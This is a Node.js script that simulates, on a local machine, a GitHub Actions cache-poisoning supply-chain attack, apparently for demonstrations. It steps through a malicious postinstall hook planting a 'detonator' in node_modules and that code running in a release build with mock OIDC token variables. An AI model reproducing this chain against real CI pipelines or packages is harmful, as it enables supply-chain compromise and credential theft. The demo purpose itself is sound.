// Local simulation. Runs the entire attack chain on your laptop with no
// GitHub involvement, so you can demo the mechanics in a meeting without
// a second account, a fork, or a workflow run.
//
// Usage: node attack/payload/simulate-attack.js

const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

function step(label, fn) {
  console.log('\n=== ' + label + ' ===');
  fn();
}

const repoRoot = path.resolve(__dirname, '..', '..');
process.chdir(repoRoot);

step('1. Reset state', () => {
  fs.rmSync(path.join(repoRoot, 'node_modules'), { recursive: true, force: true });
  fs.rmSync(path.join(repoRoot, 'dist'), { recursive: true, force: true });
  console.log('cleared node_modules/ and dist/');
});

step('2. PR-triggered bundle-size workflow runs (simulated)', () => {
  console.log('  - npm install is about to run the attacker\'s postinstall');
  // Simulate the postinstall by directly running plant.js.
  // (In CI this would be triggered by npm install via package.json's "postinstall" hook.)
  execSync('node attack/payload/plant.js', { stdio: 'inherit' });
  console.log('  - node_modules now contains the detonator');
  console.log('  - bundle-size workflow caches node_modules (simulated: we just leave it on disk)');
});

step('3. PR is closed without merging (cache persists)', () => {
  console.log('  no-op: in real CI the cache would persist independently of the PR state');
});

step('4. Maintainer pushes to main; release workflow restores cache', () => {
  console.log('  - in real CI, actions/cache@v4 would restore node_modules from the shared store');
  console.log('  - our simulation: node_modules is already on disk from step 2');
});

step('5. Build step loads node_modules; detonator executes', () => {
  // Simulate the "release context" by setting the env vars the real release
  // workflow would have.
  const env = {
    ...process.env,
    GITHUB_REF: 'refs/heads/main',
    GITHUB_WORKFLOW: 'release (VULNERABLE)',
    GITHUB_EVENT_NAME: 'push',
    GITHUB_ACTOR: 'maintainer-account',
    ACTIONS_ID_TOKEN_REQUEST_URL: 'https://example.invalid/oidc-mint',
    ACTIONS_ID_TOKEN_REQUEST_TOKEN: 'fake-jwt-mint-token',
  };
  execSync('node -e "require(\'./node_modules/.detonator.js\')"', { stdio: 'inherit', env });
});

step('6. Inspect the marker', () => {
  const markers = fs.readdirSync('/tmp').filter(f => f.startsWith('cache-poisoning-marker-'));
  markers.sort();
  const latest = markers[markers.length - 1];
  if (!latest) {
    console.log('  no marker found — something went wrong');
    process.exit(1);
  }
  const contents = fs.readFileSync(path.join('/tmp', latest), 'utf8');
  console.log('  marker file: /tmp/' + latest);
  console.log('  marker contents:');
  console.log(contents.split('\n').map(l => '    ' + l).join('\n'));
});

console.log('\nsimulation complete. clean up with:  rm /tmp/cache-poisoning-marker-*.json');
